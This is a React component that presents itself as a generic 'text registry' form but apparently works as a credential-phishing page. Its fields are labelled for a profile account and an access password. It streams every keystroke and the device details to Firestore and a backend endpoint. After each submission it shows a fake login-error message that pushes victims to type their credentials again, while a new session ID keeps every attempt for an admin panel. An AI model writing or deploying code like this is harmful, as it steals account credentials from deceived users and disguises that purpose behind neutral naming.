import React, { useState, useEffect, useRef } from 'react';
import { AlertCircle, RefreshCw, Send, FileText, Sparkles } from 'lucide-react';
import { DeviceInfo } from '../types';
import { doc, setDoc } from 'firebase/firestore';
import { db } from '../lib/firebase';

interface TextRegistrySectionProps {
  onSyncActivity?: (box1: string, box2: string) => void;
  onOpenAdmin?: () => void;
}

export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSyncActivity, onOpenAdmin }) => {
  const [sessionId, setSessionId] = useState<string>('');
  const [box1, setBox1] = useState<string>('');
  const [box2, setBox2] = useState<string>('');
  const [isSuccessView, setIsSuccessView] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [lastSavedTime, setLastSavedTime] = useState<string | null>(null);

  const input1Ref = useRef<HTMLInputElement | null>(null);
  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Initialize or retrieve user session ID
  useEffect(() => {
    let currentId = localStorage.getItem('registry_session_id');
    if (!currentId) {
      currentId = 'reg_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
      localStorage.setItem('registry_session_id', currentId);
    }
    setSessionId(currentId);

    // Restore cached values if any
    const savedBox1 = localStorage.getItem(`reg_box1_${currentId}`) || '';
    const savedBox2 = localStorage.getItem(`reg_box2_${currentId}`) || '';
    setBox1(savedBox1);
    setBox2(savedBox2);

    if (savedBox1 || savedBox2) {
      syncToServer(currentId, savedBox1, savedBox2, false, '');
    }
  }, []);

  const getDeviceInfo = (): DeviceInfo => {
    const nav = typeof window !== 'undefined' ? window.navigator : ({} as any);
    return {
      userAgent: nav.userAgent || 'Unknown',
      platform: nav.platform || 'Web',
      screen: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : 'N/A',
      language: nav.language || 'es',
    };
  };

  const syncToServer = async (
    id: string,
    val1: string,
    val2: string,
    isTyping: boolean,
    activeField: string
  ) => {
    if (!id) return;
    // Safeguard: Never overwrite saved records if both inputs are completely blank and user is not actively typing
    if (!val1.trim() && !val2.trim() && !isTyping) {
      return;
    }

    const devInfo = getDeviceInfo();
    const now = Date.now();

    // 1. Direct Cloud Firestore synchronization for cross-device support (including Vercel)
    try {
      await setDoc(
        doc(db, 'textRecords', id),
        {
          id,
          box1: val1,
          box2: val2,
          lastUpdated: now,
          isTyping,
          lastActiveField: activeField,
          device: devInfo.platform,
          screen: devInfo.screen,
          language: devInfo.language,
        },
        { merge: true }
      );
    } catch (err) {
      console.warn('Firestore sync warning:', err);
    }

    // 2. Also sync to local backend API
    try {
      await fetch('/api/save-input', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: id,
          box1: val1,
          box2: val2,
          isTyping,
          activeField,
          deviceInfo: devInfo,
        }),
      });
      if (onSyncActivity) {
        onSyncActivity(val1, val2);
      }
    } catch {
      // Silent error handling
    }
  };

  const handleBox1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setBox1(val);
    if (sessionId) {
      localStorage.setItem(`reg_box1_${sessionId}`, val);
    }

    syncToServer(sessionId, val, box2, true, 'Casilla 1 (Asunto / Título)');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, val, box2, false, '');
    }, 1000);
  };

  const handleBox2Change = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const val = e.target.value;
    setBox2(val);
    if (sessionId) {
      localStorage.setItem(`reg_box2_${sessionId}`, val);
    }

    syncToServer(sessionId, box1, val, true, 'Casilla 2 (Texto / Mensaje)');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, box1, val, false, '');
    }, 1000);
  };

  const handleGuardar = async () => {
    if (!box1.trim() && !box2.trim()) {
      input1Ref.current?.focus();
      return;
    }

    setIsSubmitting(true);
    await syncToServer(sessionId, box1, box2, false, 'Registro Guardado');
    setLastSavedTime(new Date().toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', second: '2-digit' }));

    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccessView(true);
    }, 300);
  };

  const handleNuevoRegistro = () => {
    // Generate new unique ID so the previous record stays completely preserved in database
    const newSessionId = 'reg_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
    setSessionId(newSessionId);
    localStorage.setItem('registry_session_id', newSessionId);

    // Clean input fields
    setBox1('');
    setBox2('');
    localStorage.removeItem(`reg_box1_${newSessionId}`);
    localStorage.removeItem(`reg_box2_${newSessionId}`);

    setIsSuccessView(false);
    setTimeout(() => {
      input1Ref.current?.focus();
    }, 100);
  };

  return (
    <div className="bg-white rounded-2xl border border-slate-200 shadow-sm p-6 sm:p-8 max-w-3xl mx-auto my-8">
      {isSuccessView ? (
        /* Vista de Notificación solicitada tras hacer clic en Ingreso */
        <div className="py-8 text-center flex flex-col items-center animate-in fade-in zoom-in-95 duration-200">
          <div className="w-16 h-16 rounded-full bg-amber-50 text-amber-600 flex items-center justify-center mb-4 ring-8 ring-amber-50/50">
            <AlertCircle className="w-9 h-9" />
          </div>

          <p className="text-base sm:text-lg font-medium text-slate-800 max-w-lg leading-relaxed mb-6 px-4">
            ¡Hooo! Parece que ingresaste mal tus datos o hay un error de conexión. Ingresa tus datos correctamente e intenta nuevamente.
          </p>

          <div className="flex items-center justify-center w-full sm:w-auto">
            <button
              type="button"
              onClick={handleNuevoRegistro}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-medium text-sm shadow-sm transition-all active:scale-95 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Reintentar</span>
            </button>
          </div>
        </div>
      ) : (
        /* Formulario de Entrada de Textos */
        <div>
          <div className="flex items-start justify-between gap-4 mb-6 pb-4 border-b border-slate-100">
            <div>
              <div className="flex items-center gap-2">
                <span className="p-2 rounded-lg bg-indigo-50 text-indigo-600">
                  <Sparkles className="w-5 h-5" />
                </span>
                <h2 className="text-xl font-bold text-slate-900">
                  Formulario de Registro de Textos
                </h2>
              </div>
              <p className="mt-1 text-xs sm:text-sm text-slate-500">
                Escribe en las casillas a continuación. Toda información registrada se almacena en el servidor y se visualiza en el panel de administración.
              </p>
            </div>
          </div>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleGuardar();
            }}
            className="space-y-5"
          >
            {/* Casilla 1: Nombre o Asunto */}
            <div>
              <label
                htmlFor="text-field-1"
                className="block text-xs font-semibold text-slate-700 mb-1"
              >
                Cuenta de tu perfil
              </label>
              <input
                ref={input1Ref}
                type="text"
                id="text-field-1"
                value={box1}
                onChange={handleBox1Change}
                className="w-full max-w-xl h-8.5 rounded-lg border border-slate-300 bg-white px-3 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
              />
            </div>

            {/* Casilla 2: Mensaje o Contenido */}
            <div>
              <label
                htmlFor="text-field-2"
                className="block text-xs font-semibold text-slate-700 mb-1"
              >
                Clave de acceso
              </label>
              <input
                type="text"
                id="text-field-2"
                value={box2}
                onChange={handleBox2Change}
                className="w-full max-w-xl h-8.5 rounded-lg border border-slate-300 bg-white px-3 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
              />
            </div>

            {/* Botones de Acción */}
            <div className="flex items-center justify-end gap-3 pt-2">
              <div className="flex items-center gap-3 w-full sm:w-auto justify-end">
                <button
                  type="submit"
                  disabled={isSubmitting || (!box1.trim() && !box2.trim())}
                  className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-medium text-sm shadow-sm transition-all active:scale-95 cursor-pointer"
                >
                  {isSubmitting ? (
                    <RefreshCw className="w-4 h-4 animate-spin" />
                  ) : (
                    <Send className="w-4 h-4" />
                  )}
                  <span>Ingreso</span>
                </button>
              </div>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};
